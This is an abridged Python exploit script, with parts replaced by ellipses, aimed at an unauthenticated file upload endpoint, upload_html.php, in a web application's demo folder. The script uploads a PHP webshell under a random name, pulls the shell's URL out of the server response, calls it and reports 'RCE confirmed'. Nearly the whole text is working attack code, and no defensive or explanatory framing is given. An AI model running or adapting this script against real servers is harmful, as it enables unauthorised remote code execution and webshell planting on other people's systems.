...
def main() -> int:
    parser = argparse.ArgumentParser(
        description="Exploit unauthenticated upload->RCE via upload_html.php"
    )
    ...
    upload_url = urljoin(base, "demos/demos/filereader/upload_html.php")
    shell_name = args.shell_name or f"ws_html_{uuid.uuid4().hex[:8]}.php"
    ...
    print("[*] Uploading webshell via upload_html.php ...")

    resp = requests.post(upload_url, data=data, files=files, timeout=args.timeout)
    ...
    if match:
        shell_url = urljoin(upload_url, match.group(1))
    ...
    if trigger.status_code == 200 and output:
        print("[+] RCE confirmed via upload_html.php")
        return 0
